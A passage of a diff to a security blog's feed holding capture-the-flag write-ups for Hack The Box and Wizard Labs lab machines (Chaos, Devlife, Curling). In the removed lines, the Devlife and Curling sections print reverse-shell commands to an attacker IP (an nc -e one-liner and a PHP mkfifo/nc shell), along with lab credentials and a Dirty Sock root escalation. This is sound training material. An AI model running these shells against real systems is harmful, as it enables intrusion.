another user and escape &lt;code class=&quot;highlighter-rouge&quot;&gt;rbash&lt;/code&gt;. For root privilege escalation we will extract root credentials from a firefox profile and get a root shell. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.120&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;chaos.htb&lt;/code&gt;. Let’s jump right in.&lt;/h4&gt;
@@ -274,6 +937,7 @@ Gobuster v2.0.0              OJ Reeves (@TheColonial)
 &lt;p&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---conceal&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/conceal/&quot;&gt;Hack The Box - Conceal&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---sizzle&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/sizzle/&quot;&gt;Hack The Box - Sizzle&lt;/a&gt;&lt;/h4&gt;
 &lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="rbash" /><category term="LaTeX injection" /><category term="Wordpress" /><category term="Cryptography" /><summary type="html">Quick Summary Hey guys today Chaos retired and here’s my write-up about it. Chaos was a CTF-style machine, I can’t say that it simulated a real life situation. I had fun solving this box, some steps were straightforward others were very tricky. About main steps, To get an initial shell as www-data we will exploit a web application that used LaTeX. After that we will escalate privileges to another user and escape rbash. For root privilege escalation we will extract root credentials from a firefox profile and get a root shell. It’s a Linux box and its ip is 10.10.10.120, I added it to /etc/hosts as chaos.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC chaos.htb We got some ports. http on port 80 and 10000, email related services (imap, pop3) running on ports 110, 143, 993 and 995. Let’s check http. HTTP Initial Enumeration Port 10000 gave me this error : So I switched to https and got a login form : We don’t have any credentials and I ran gobuster and got nothing interesting so we will ignore this and look at port 80. It’s just a normal website, rest of it : I checked that contact form and it’s doing nothing. I ran gobuster on chaos.htb and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://chaos.htb/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:36:56 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /javascript (Status: 301) /js (Status: 301) /server-status (Status: 403) /source (Status: 301) ===================================================== 2019/05/24 14:40:36 Finished ===================================================== And now this part is tricky. Because going to the ip of the box 10.10.10.120 instead of chaos.htb will give us a different thing (virtual hosting). It’s saying Direct IP not allowed. I ran another gobuster scan on the ip and got different results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.120/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:41:52 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /wp (Status: 301) ===================================================== 2019/05/24 14:45:37 Finished ===================================================== On chaos.htb the thing the caught my attention was /source so I checked that and it didn’t have anything : I checked http://10.10.10.120/wp and found a wordpress website : I looked at the posts, there was only one post and it was password protected : I clicked on the post link and saw that the author of the post is called human : Before trying to bruteforce the password I tried some basic stuff first and the username:username type of credentials worked. The password was human : And we got some credentials for mail : ayush:jiujitsu Accessing the e-mail Service, Decrypting Secret Message We saw earlier some email services running on the machine. Now we have credentials to access these services. To do that we will use an email client, I used claws-mail (can be installed with apt) and configured it like this : Inbox was empty but drafts had something : ``` From: ayush ayush@localhost To: undisclosed-recipients:; Subject: service Date: Sun, 28 Oct 2018 17:46:38 +0530 User-Agent: Roundcube Webmail/1.3.8</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/chaos/0.png" /></entry><entry><title type="html">Hack The Box - Conceal</title><link href="http://localhost:4000/hack-the-box/conceal/" rel="alternate" type="text/html" title="Hack The Box - Conceal" /><published>2019-05-18T00:00:00+02:00</published><updated>2019-05-18T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/conceal</id><content type="html" xml:base="http://localhost:4000/hack-the-box/conceal/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
@@ -2986,150 +3650,4 @@ child.sendline('whoami')
 &lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
 &lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
 &lt;h4 id=&quot;previous-wizard-labs-write-up--wizard-labs---dummy&quot;&gt;Previous Wizard Labs Write-up : &lt;a href=&quot;/wizard-labs/dummy/&quot;&gt;Wizard Labs - Dummy&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="Python" /><summary type="html">Quick Summary Hey guys this is my write-up about Devlife from Wizard Labs which is their second box to retire. Just like dummy it’s another easy box (Difficulty : 2/10) , It’s a linux box and its ip is 10.1.1.20 so let’s jump right in ! Nmap We will start with nmap to scan for open ports and services : nmap -sV -sT -sC 10.1.1.20 Only 2 ports are open , 22 running ssh and 80 running http. Let’s check http. HTTP Initial Enumeration On the main page we get this “About me” message and nothing else : About Me Hello , My name is Teddy Smith , I am a Python developer since 2007 ! Here I gonna share some Django tutorials and tutorials about System Administation in Python also I will write a Python online interpreter !! Stay Tuned ... TS I ran gobuster with /usr/share/wordlists/dirb/common.txt and got these results : /.htpasswd (Status: 403) /.htaccess (Status: 403) /.hta (Status: 403) /dev (Status: 301) /index.html (Status: 200) /manual (Status: 301) /server-status (Status: 403) Getting user So I checked /dev and found this Online Python 2.7 Interpreter : Great , now we can get a reverse shell in many ways , I just imported os then did os.system(reverse shell payload) : import os;os.system('nc -e /bin/bash 10.xx.xx.xx 1337') And we owned user ! Stored root Credentials , Privilege Escalation In the /home directory of tedd there is a directory called .env , Let’s check that. We notice a python script called su.py , which runs su root and uses the password to authenticate : import pexpect child = pexpect.spawn('su root') child.expect ('Password:') child.sendline('teddyxy2019') child.expect('\$') child.sendline('whoami') Now we can su to root using the password teddyxy2019 : And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Wizard Labs Write-up : Wizard Labs - Dummy</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/wizardlabs/devlife/0.png" /></entry><entry><title type="html">Hack The Box - Curling</title><link href="http://localhost:4000/hack-the-box/curling/" rel="alternate" type="text/html" title="Hack The Box - Curling" /><published>2019-03-30T00:00:00+02:00</published><updated>2019-03-30T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/curling</id><content type="html" xml:base="http://localhost:4000/hack-the-box/curling/">&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
-&lt;h4 id=&quot;hey-guys-today-curling-retired-and-here-is-my-write-up-about-it-i-had-a-lot-of-fun-doing-this-box-as-it-was-easy-and-simple-also-it-was-straightforward--no-rabbit-holes-and-such-things-its-a-linux-box-and-its-ip-is-101010150-i-added-it-to-etchosts-as-curlinghtb-lets-jump-right-in-&quot;&gt;Hey guys today Curling retired and here is my write-up about it. I had a lot of fun doing this box as it was easy and simple. Also it was straightforward , no rabbit holes and such things. It’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.150&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;curling.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC curling.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/curling/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-only-get-2-open-ports--80-running-http-and-22-running-ssh-lets-look-at-http&quot;&gt;We only get 2 open ports , 80 running http and 22 running ssh. Let’s look at http.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-see-a-blog-titled-cewl-curling-site--and-its-joomla-at-this-point-i-would-run-joomscan-but-i-wanted-to-do-some-manual-enumeration-first--so-i-checked-the-source-of-the-page-and-at-the-end-of-the-body-i-found-this-comment-&quot;&gt;We see a blog titled “Cewl Curling site!” , and it’s &lt;a href=&quot;https://www.joomla.org/&quot;&gt;joomla&lt;/a&gt;. At this point I would run &lt;code class=&quot;highlighter-rouge&quot;&gt;joomscan&lt;/code&gt; but I wanted to do some manual enumeration first , so I checked the source of the page and at the end of the body I found this comment :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;so-i-checked-secrettxt-and-found-this-base64-string-&quot;&gt;So I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/secret.txt&lt;/code&gt; and found this &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; string :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;decoding-&quot;&gt;Decoding :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;curling2018-we-can-use-that-as-a-password-but-what-is-the-username--if-we-take-a-look-at-the-main-page-again-and-read-the-posts-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Curling2018!&lt;/code&gt; we can use that as a password. But what is the username ? If we take a look at the main page again and read the posts :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-will-notice-a-name-in-one-of-the-posts--floris--now-we-can-try-to-login-as-floris-with-the-password-curling2018-&quot;&gt;We will notice a name in one of the posts : &lt;code class=&quot;highlighter-rouge&quot;&gt;Floris&lt;/code&gt; , now we can try to login as &lt;code class=&quot;highlighter-rouge&quot;&gt;floris&lt;/code&gt; with the password &lt;code class=&quot;highlighter-rouge&quot;&gt;Curling2018!&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/7.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/curling/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-it-worked-while-i-was-doing-this-enumeration-i-ran-gobuster-in-the-background-and-got-these-results-&quot;&gt;And it worked. While I was doing this enumeration I ran gobuster in the background and got these results :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/.htpasswd (Status: 403)
-/.hta (Status: 403)
-/administrator (Status: 301)
-/.htaccess (Status: 403)
-/bin (Status: 301)
-/cache (Status: 301)
-/components (Status: 301)
-/images (Status: 301)
-/includes (Status: 301)
-/index.php (Status: 200)
-/language (Status: 301)
-/layouts (Status: 301)
-/libraries (Status: 301)
-/media (Status: 301)
-/modules (Status: 301)
-/plugins (Status: 301)
-/server-status (Status: 403)
-/templates (Status: 301)
-/tmp (Status: 301)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;lets-go-to-administrator-and-login-to-the-administration-panel-&quot;&gt;Let’s go to &lt;code class=&quot;highlighter-rouge&quot;&gt;/administrator&lt;/code&gt; and login to the administration panel :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/9.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/curling/10.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/curling/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;editing-template-files-and-getting-a-reverse-shell-&quot;&gt;Editing Template Files and Getting a Reverse Shell :&lt;/h3&gt;
-&lt;h4 id=&quot;on-the-configuration-section-theres-an-option-for-templates-&quot;&gt;On the configuration section there’s an option for templates :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;by-going-to-that-we-notice-that-protostar-is-the-default-style-and-template-&quot;&gt;By going to that we notice that protostar is the default style and template :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/13.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/curling/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;from-templates-we-will-go-to-protostar-details-and-files-and-create-a-new-php-file-&quot;&gt;From templates we will go to &lt;code class=&quot;highlighter-rouge&quot;&gt;Protostar Details and Files&lt;/code&gt; and create a new &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/15.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/curling/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;in-the-php-file-we-will-execute-a-system-command-to-get-a-reverse-shell-&quot;&gt;In the php file we will execute a system command to get a reverse shell :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
-    system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f');
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;after-we-save-the-file-we-will-go-to-httpcurlinghtbtemplatesprotostarfilephp&quot;&gt;After we save the file we will go to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://curling.htb/templates/protostar/file.php&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-we-check-our-listener-&quot;&gt;Then we check our listener :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;user&quot;&gt;User&lt;/h3&gt;
-&lt;h4 id=&quot;we-got-a-reverse-shell-as-www-data--in-the-home-directory-theres-a-directory-for-floris-&quot;&gt;We got a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; , in the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory there’s a directory for &lt;code class=&quot;highlighter-rouge&quot;&gt;floris&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-dont-have-read-access-to-usertxt--but-we-notice-a-file-called-password_backup--by-looking-at-that-file-&quot;&gt;We don’t have read access to &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; , but we notice a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;password_backup&lt;/code&gt; , by looking at that file :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;its-a-hex-dump-file--so-i-copied-it-to-my-box-to-reverse-it-&quot;&gt;It’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;hex dump&lt;/code&gt; file , So I copied it to my box to reverse it :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;to-reverse-a-hex-dump-file-we-will-use-xxd--so-xxd--r-pw_backup-&quot;&gt;To reverse a &lt;code class=&quot;highlighter-rouge&quot;&gt;hex dump&lt;/code&gt; file we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;xxd&lt;/code&gt; , so &lt;code class=&quot;highlighter-rouge&quot;&gt;xxd -r pw_backup&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;not-a-normal-output--lets-redirect-the-output-to-a-file-and-see-&quot;&gt;Not a normal output , let’s redirect the output to a file and see :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;so-what-happened-is--it-turned-out-to-be-a-bzip2-file-so-i-decompressed-it-then-got-a-new-gzip-file--decompressed-it-and-got-another-bzip2-file--after-decompression-i-got-a-tar-file--then-finally-a-txt-file-for-the-password-&quot;&gt;So what happened is , it turned out to be a &lt;code class=&quot;highlighter-rouge&quot;&gt;bzip2&lt;/code&gt; file so I decompressed it then got a new &lt;code class=&quot;highlighter-rouge&quot;&gt;gzip&lt;/code&gt; file , decompressed it and got another &lt;code class=&quot;highlighter-rouge&quot;&gt;bzip2&lt;/code&gt; file , after decompression I got a &lt;code class=&quot;highlighter-rouge&quot;&gt;tar&lt;/code&gt; file , then finally a &lt;code class=&quot;highlighter-rouge&quot;&gt;txt&lt;/code&gt; file for the password :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;lets-ssh-as-floris-&quot;&gt;Let’s &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;floris&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-owned-user-&quot;&gt;And we owned user !&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;curling&quot;&gt;Curling&lt;/h3&gt;
-&lt;h4 id=&quot;by-looking-at-the-home-directory-of-floris-again-&quot;&gt;By looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;floris&lt;/code&gt; again :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;theres-a-directory-called-admin-area-which-contains-two-files-&quot;&gt;There’s a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;admin-area&lt;/code&gt; which contains two files :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;input-and-report&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;input&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;report&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;input-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;input&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;url--http127001&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;url = &quot;http://127.0.0.1&quot;&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;report-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;report&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;its-obvious-that-this-is-the-output-of-executing-curl-on-http127001-&quot;&gt;It’s obvious that this is the output of executing &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;http://127.0.0.1&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;even-the-name-of-the-box-is-a-hint-curling--so-what-about-changing-that-url-from-localhost-to-something-else-like-a-file--next-time-the-command-gets-executed-we-will-get-the-contents-of-that-file--maybe-roottxt--but-only-if-its-getting-executed-by-root-lets-try-and-see-if-it-will-work-&quot;&gt;Even the name of the box is a hint &lt;code class=&quot;highlighter-rouge&quot;&gt;curling&lt;/code&gt; , so what about changing that &lt;code class=&quot;highlighter-rouge&quot;&gt;url&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;localhost&lt;/code&gt; to something else like a file ? Next time the command gets executed we will get the contents of that file , maybe &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; ? But only if it’s getting executed by &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;. Let’s try and see if it will work :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-we-will-do--watch-cat-report--this-is-executing-cat-report-every-2-seconds-and-giving-us-the-output--easier-than-checking-manually-&quot;&gt;Then we will do : &lt;code class=&quot;highlighter-rouge&quot;&gt;watch cat report&lt;/code&gt; , this is executing &lt;code class=&quot;highlighter-rouge&quot;&gt;cat report&lt;/code&gt; every 2 seconds and giving us the output , easier than checking manually :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;after-some-time-we-get-the-flag&quot;&gt;After some time we get the flag.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;dirty-sock--root-shell-&quot;&gt;Dirty Sock ? Root shell !&lt;/h3&gt;
-&lt;h4 id=&quot;i-didnt-like-the-fact-that-i-could-only-read-the-flag--i-wanted-a-root-shell-so-i-tried-for-a-long-time-to-bypass-the-url-thing-and-get-a-reverse-shell--but-couldnt-then-when-i-did-this-box-again-for-the-write-up--one-of-the-things-that-caught-my-attention-is-that-we-are-on-an-ubuntu-box--so-i-checked-snap-version-to-know-if-its-vulnerable-to-cve-2019-7304-known-as-dirty-sock-and-of-course-it-was-&quot;&gt;I didn’t like the fact that I could only read the flag , I wanted a &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; shell. So I tried for a long time to bypass the &lt;code class=&quot;highlighter-rouge&quot;&gt;url&lt;/code&gt; thing and get a reverse shell , but couldn’t. Then when I did this box again for the write-up , one of the things that caught my attention is that we are on an &lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt; box , so I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;snap&lt;/code&gt; version to know if it’s vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2019-7304&lt;/code&gt; known as &lt;code class=&quot;highlighter-rouge&quot;&gt;Dirty Sock&lt;/code&gt; and of course it was :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;this-is-not-intended-at-all-because-by-the-time-this-box-was-released---cve-2019-7304-wasnt-disclosed-yet&quot;&gt;This is not intended at all because by the time this box was released ,  &lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2019-7304&lt;/code&gt; wasn’t disclosed yet.&lt;/h4&gt;
-&lt;h4 id=&quot;i-got-the-exploit-from-here--then-hosted-it-on-a-python-simple-http-server-and-downloaded-it-on-the-box-&quot;&gt;I got the exploit from &lt;a href=&quot;https://github.com/initstring/dirty_sock&quot;&gt;here&lt;/a&gt; , Then hosted it on a python simple http server and downloaded it on the box :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/35.png&quot; alt=&quot;&quot; /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;python3 dirty_sockv2.py&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/curling/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-we-can-su-to-dirty_sock-and-execute-commands-as-root-&quot;&gt;Now we can &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;dirty_sock&lt;/code&gt; and execute commands as root :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;or-just-sudo-su-and-we-will-get-a-root-shell-&quot;&gt;Or just &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; and we will get a root shell :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/curling/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-owned-root-&quot;&gt;We owned root !&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---frolic&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/frolic/&quot;&gt;Hack The Box - Frolic&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---vault&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/vault/&quot;&gt;Hack The Box - Vault&lt;/a&gt;&lt;/h4&gt;
